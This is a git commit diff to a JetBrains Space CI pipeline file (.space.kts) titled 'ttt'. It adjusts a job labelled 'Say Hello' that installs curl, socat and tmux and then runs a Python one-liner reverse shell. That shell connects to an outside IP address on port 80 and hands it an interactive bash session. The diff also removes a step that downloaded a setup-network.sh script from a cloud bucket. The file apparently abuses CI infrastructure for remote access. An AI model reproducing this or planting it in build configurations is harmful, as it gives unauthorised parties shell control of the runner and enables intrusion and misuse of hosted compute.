481950c8688db69f36a734d01c44cd6769d73ba3
python cloudspace <cs4python@gmail.com>
2022-08-31 11:57:09 +0000

    ttt

--- .space.kts
+++ .space.kts
@@ -6,7 +6,7 @@
 
 
 job("ttt") {
-    container(displayName = "Say Hello", image = "ubuntu") {
+    container(displayName = "Say Hello ttt", image = "ubuntu") {
         shellScript {
             content = """
                 echo Hello
@@ -14,16 +14,9 @@ job("ttt") {
                 pwd
                 whoami
                 apt update -y  && apt install curl tmux sudo wget socat -y 
-                
                 python3 -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('159.75.14.198',80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"
-				sleep 600
-
-                
+				sleep 600              
             """
-        }
-        service("npc service") {
-            curl -O -k https://bucket-2022.s3.us-west-004.backblazeb2.com/linshi/setup-network.sh
-            sleep 300
         }
     }
 }
